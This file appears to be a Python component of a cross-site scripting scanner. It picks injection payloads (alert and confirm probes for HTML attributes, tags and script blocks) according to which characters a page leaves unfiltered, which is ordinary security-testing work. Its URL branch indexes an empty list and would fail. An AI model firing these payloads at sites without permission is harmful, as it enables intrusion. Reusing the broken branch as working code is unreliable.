

class attack_methodology:

    attr    = ['" onmouseover="alert(1)', "' onmouseover='alert(1)"]
    html    = ['<img src=x onerror="alert(1)">']
    script  = ['"; confirm(1); "', "'; confirm(1); '",  '</script><script>alert(1)</script>']
    url     = [] 

    def get_attack_payload(self, context, presence, double_quotes, single_quotes, lessthan_sign, forward_slash):
        payloads = []
        
        if context == 'ATTR':
            if not presence: return False, None
            if not double_quotes:   payloads.append(self.attr[0])
            if not single_quotes:   payloads.append(self.attr[1])
            return True, payloads

        if context == 'HTML':
            if not presence: return False, None
            if not lessthan_sign:   payloads.append(self.html[0])
            return True, payloads

        if context == 'SCRIPT':
            if not presence: return False, None
            if not double_quotes:   payloads.append(self.script[0])
            if not single_quotes:   payloads.append(self.script[1])
            if not lessthan_sign:   payloads.append(self.script[2])
            return True, payloads
            
        if context == 'URL':
            if not presence: return False, None
            if not double_quotes:   payloads.append(self.url[0])
            if not single_quotes:   payloads.append(self.url[1])
            return True, payloads
        
        return False, None


